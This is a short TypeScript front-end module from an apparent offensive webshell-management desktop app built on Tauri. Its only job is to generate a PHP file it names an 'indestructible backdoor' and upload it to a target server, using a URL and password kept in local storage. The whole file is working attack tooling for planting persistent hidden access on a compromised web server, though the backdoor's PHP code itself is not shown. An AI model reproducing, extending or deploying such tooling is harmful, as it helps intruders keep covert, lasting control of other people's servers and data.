import { invoke } from "@tauri-apps/api/tauri";
import { upload_file } from "./modules/file_upload";
import { message } from "@tauri-apps/api/dialog";



const url = localStorage.getItem("url") || "";
const password = localStorage.getItem("password") || "";


if (url === "" || password === "") {
    await message("Please enter url, password and command first.", "Warning");
}

const form = document.getElementById("uploadIndestructibleBackdoor");
// @ts-ignore
form.addEventListener("submit", async function (event) {
    event.preventDefault();
    // @ts-ignore
    const key = document.getElementById("key").value;
    // @ts-ignore
    const password2 = document.getElementById("password").value;
    const content = await invoke("get_indestructible_backdoor_file", { password: password2, key });
    upload_file(url, password, content, "indestructible_backdoor.php");
})